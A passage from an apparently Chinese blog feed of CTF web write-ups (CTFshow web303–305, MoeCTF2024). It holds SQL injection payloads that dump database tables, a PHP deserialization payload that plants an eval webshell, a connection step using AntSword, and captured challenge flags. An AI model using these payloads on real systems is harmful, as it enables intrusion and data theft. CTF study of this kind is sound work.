punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:dpt.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>首先访问apt.php可以新增表单，新增后抓包进行sql注入</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/dptadd.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gd7ltvs2a269115fvk9s234121</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Dnt</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show/dpt.php</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">204</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>dpt_name=1&amp;dpt_address=1&amp;dpt_build_year=2024-08-01&amp;dpt_has_cert=on&amp;dpt_cert_number=a',sds_telephone=(Payload);%23&amp;dpt_telephone_number=a</code></pre><p>Payload:</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查表名  sds_dpt,sds_fl9g,sds_user</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 查列名  flag</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'sds_fl9g'</span><span class="token comment"># getFlag </span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token string">'sds_fl9g'</span></code></pre><p><img src="web303.png" loading="lazy"></p><h4 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h4><p>Hint:</p><p>增加了全局waf</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|-/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>但是其实没有上waf。只是换了个表名，把<code>sds_fl9g</code>换成了<code>sds_flaag</code>而已。其他都同上题。</p><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> flag <span class="token keyword">from</span> sds_flaag</code></pre><h4 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>虽然过滤很狠，但是多了个class.php文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>然后在checklogin.php文件中发现了反序列化操作</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'fun.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$user_cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>直接构造反序列化字符</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST['attack']);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>因为cookie中将”作为截断符号，所需要编码绕过，这里采用url编码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>user<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>a<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A31<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token keyword">eval</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">27</span>attack<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>然后用蚁剑连接，因为账号密码已经给了，所以直接连接数据库就行(注意本地下载的sql密码和真正的不一样)</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-web</title>
      <link href="/2024/08/10/MoeCTF2024-web/"/>
      <url>/2024/08/10/MoeCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h4><p><img src="ProveYourLove.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># 源码&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;表白墙&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;style&gt;        body &#123;            font-family: Arial, sans-serif;            margin: 20px;            padding: 0;            background-image: url(&#39;static&#x2F;image.jpg&#39;);            background-size: cover;            background-repeat: no-repeat;            background-position: center center;            color: #fff;        &#125;        .container &#123;            max-width: 600px;            margin: 0 auto;            background: rgba(0, 0, 0, 0.6); &#x2F;* 半透明背景 *&#x2F;            padding: 20px;            border-radius: 8px;        &#125;        h1 &#123;            text-align: center;            margin-top: 0;        &#125;        form &#123;            margin-bottom: 20px;        &#125;        label &#123;            display: block;            margin-top: 10px;        &#125;        input[type&#x3D;&quot;text&quot;], textarea, select &#123;            width: calc(100% - 16px); &#x2F;* 统一宽度，减去内边距 *&#x2F;            padding: 8px;            margin-top: 5px;            border-radius: 4px;            border: 1px solid #ddd;            background-color: rgba(255, 255, 255, 0.2); &#x2F;* 半透明背景 *&#x2F;            color: #fff;            box-sizing: border-box; &#x2F;* 确保宽度包括内边距和边框 *&#x2F;        &#125;        textarea &#123;            width: calc(100% - 16px); &#x2F;* 确保文本区域宽度一致 *&#x2F;        &#125;        input[type&#x3D;&quot;submit&quot;] &#123;            margin-top: 10px;            padding: 10px 20px;            font-size: 16px;            background-color: #4CAF50;            color: white;            border: none;            border-radius: 4px;            cursor: pointer;        &#125;        input[type&#x3D;&quot;submit&quot;]:hover &#123;            background-color: #45a049;        &#125;        .status &#123;            margin-top: 20px;            text-align: center;            font-size: 18px;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;div class&#x3D;&quot;container&quot;&gt;        &lt;h1&gt;表白墙&lt;&#x2F;h1&gt;        &lt;form id&#x3D;&quot;confessionForm&quot;&gt;            &lt;label for&#x3D;&quot;nickname&quot;&gt;昵称:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;nickname&quot; name&#x3D;&quot;nickname&quot; required placeholder&#x3D;&quot;输入您的昵称&quot;&gt;            &lt;label for&#x3D;&quot;user_gender&quot;&gt;您的性别:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;user_gender&quot; name&#x3D;&quot;user_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;男&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;女&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;其他&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;target&quot;&gt;表白对象:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;target&quot; name&#x3D;&quot;target&quot; required placeholder&#x3D;&quot;输入您表白的对象&quot;&gt;            &lt;label for&#x3D;&quot;target_gender&quot;&gt;表白对象的性别:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;target_gender&quot; name&#x3D;&quot;target_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;男&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;女&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;其他&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;message&quot;&gt;表白内容:&lt;&#x2F;label&gt;            &lt;textarea id&#x3D;&quot;message&quot; name&#x3D;&quot;message&quot; rows&#x3D;&quot;6&quot; required placeholder&#x3D;&quot;输入您的表白内容&quot;&gt;&lt;&#x2F;textarea&gt;            &lt;label for&#x3D;&quot;anonymous&quot;&gt;是否匿名:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;anonymous&quot; name&#x3D;&quot;anonymous&quot; required&gt;                &lt;option value&#x3D;&quot;false&quot;&gt;不匿名&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;true&quot;&gt;匿名&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交表白&quot;&gt;        &lt;&#x2F;form&gt;        &lt;div class&#x3D;&quot;status&quot;&gt;            当前表白份数: &lt;span id&#x3D;&quot;confessionCount&quot;&gt;加载中...&lt;&#x2F;span&gt;&lt;br&gt;            flag: &lt;span id&#x3D;&quot;flag&quot;&gt;访问confession_count获取&lt;&#x2F;span&gt;&lt;br&gt;            Qixi_flag: &lt;span id&#x3D;&quot;Qixi_flag&quot;&gt;访问questionnaire_count获取&lt;&#x2F;span&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;script&gt;        document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123;            &#x2F;&#x2F; 获取当前表白份数            fetch(&#39;&#x2F;confession_count&#39;)                .then(response &#x3D;&gt; response.json())                .then(data &#x3D;&gt; &#123;                    document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                    document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                    document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                &#125;)                .catch(error &#x3D;&gt; &#123;                    console.error(&#39;Error:&#39;, error);                &#125;);        &#125;);        document.getElementById(&#39;confessionForm&#39;).addEventListener(&#39;submit&#39;, function(event) &#123;            event.preventDefault(); &#x2F;&#x2F; 阻止表单的默认提交行为            &#x2F;&#x2F; 检查设备是否已提交过表白            if (localStorage.getItem(&#39;confessionSubmitted&#39;)) &#123;                alert(&#39;您已经提交过表白，不能重复提交。&#39;);                return;            &#125;            &#x2F;&#x2F; 发起 OPTIONS 请求            fetch(&#39;&#x2F;questionnaire&#39;, &#123;                method: &#39;OPTIONS&#39;            &#125;)            .then(response &#x3D;&gt; &#123;                if (!response.ok) &#123;                    throw new Error(&#39;OPTIONS 请求失败&#39;);                &#125;                &#x2F;&#x2F; 获取表单数据                const formData &#x3D; new FormData(event.target);                const data &#x3D; &#123;&#125;;                formData.forEach((value, key) &#x3D;&gt; &#123;                    data[key] &#x3D; value;                &#125;);                &#x2F;&#x2F; 提交表白数据                return fetch(&#39;&#x2F;questionnaire&#39;, &#123;                    method: &#39;POST&#39;,                    headers: &#123;                        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;                    &#125;,                    body: JSON.stringify(data)                &#125;);            &#125;)            .then(response &#x3D;&gt; response.json())            .then(result &#x3D;&gt; &#123;                if (result.success) &#123;                    alert(&#39;表白提交成功！&#39;);                    localStorage.setItem(&#39;confessionSubmitted&#39;, &#39;true&#39;);                    &#x2F;&#x2F; 更新表白份数                    fetch(&#39;&#x2F;confession_count&#39;)                        .then(response &#x3D;&gt; response.json())                        .then(data &#x3D;&gt; &#123;                            document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                            document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                            document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                        &#125;)                        .catch(error &#x3D;&gt; &#123;                            console.error(&#39;Error:&#39;, error);                        &#125;);                &#125; else &#123;                    alert(&#39;表白提交失败，请稍后重试。&#39;);                &#125;            &#125;)            .catch(error &#x3D;&gt; &#123;                console.error(&#39;Error:&#39;, error);            &#125;);        &#125;);    &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>题目给了Hint，必须发送300次才可以得到flag</p><p>问题在于，每次发送后会在本地储存<code>confessionSubmitted=true</code>这样的话第二次储存就会不允许发送</p><p>于是只要在发起请求的时候加上 <code>Cache-Control: no-store</code>来阻止进行本地储存，使用burp发送300遍即可得到flag</p><pre class="language-markup" data-language="markup"><code class="language-markup">当前表白份数: 329flag: moectf&#123;c0NgRaTuL@tioNs-ON-6EC0M1Ng-4-Lick1NG_dOG48&#125;Qixi_flag: moeCTF&#123;Happy_Chin3s3_Va13ntin3's_Day,_Baby.&#125;</code></pre><h4 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h4><p> <strong>web 七龙珠</strong></p><p>欢迎来到弗拉格之地进行 web 七龙珠试炼</p><p>在这里，你将根据引导，完成数个任务，从而获得名为 flag 的东西</p><p>本次我们采用一个叫做分段 flag 的东西，将 flag 分为七颗龙珠，集齐七颗龙珠就可以获得最终的 flag</p><p>在这次挑战中，请随时准备好你的记事本哦</p><p>现在我们开始，提示在下面 ↓</p><p>&#x2F;flag1ab.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>flag1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>至少你会跳转 url (bushi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>现在是第一道题，我们学习的是： html <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这行字的下面一片空白，但是真的什么也没有吗？<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--></span><span class="token comment">&lt;!--flag1: bW9lY3Rm--></span><span class="token comment">&lt;!--下一步：/flag2hh.php--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>恭喜你已经学会了如何查看网页源代码，但这还不够</p><p>这是第二题，本题关键词： http </p><p>想想服务器通过网络传输过来的，除了这个页面，还有什么？</p><pre class="language-http" data-language="http"><code class="language-http"># 抓包<span class="token header"><span class="token header-name keyword">flag2</span><span class="token punctuation">:</span> <span class="token header-value">e0FmdEV</span></span><span class="token header"><span class="token header-name keyword">nextpage</span><span class="token punctuation">:</span> <span class="token header-value">/flag3cad.php</span></span></code></pre><p>我想，你应该已经知道 devtools 这个东西了。(不知道也没关系，你 f12 出来的就是 devtools)</p><p>那么现在在你面前的有两个教程：</p><p>\1. 尝试把 devtools 运用熟练</p><p>\2. 尝试下载一个别的什么玩意来使用</p><p>这题，我们还是学习 http</p><p>那么，我们来试一下同时把下面要求完成吧！</p><p>-————————————————————————–</p><p>请用 GET 方法传入一个 a 参数<br>再用 POST 方法传入一个 b 参数<br>你需要使用 admin 的身份验证</p><pre class="language-markup" data-language="markup"><code class="language-markup">恭喜你已经基本掌握了 http 的最最最基础知识，先去下一关吧flag3: yX3RoMXN</code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag3cad.php?a=1</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:8846</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; 